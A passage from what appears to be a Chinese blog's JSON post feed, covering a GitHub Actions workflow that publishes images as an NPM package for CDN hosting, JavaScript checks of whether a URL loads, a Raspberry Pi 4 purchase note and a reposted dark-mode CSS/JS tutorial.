<span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 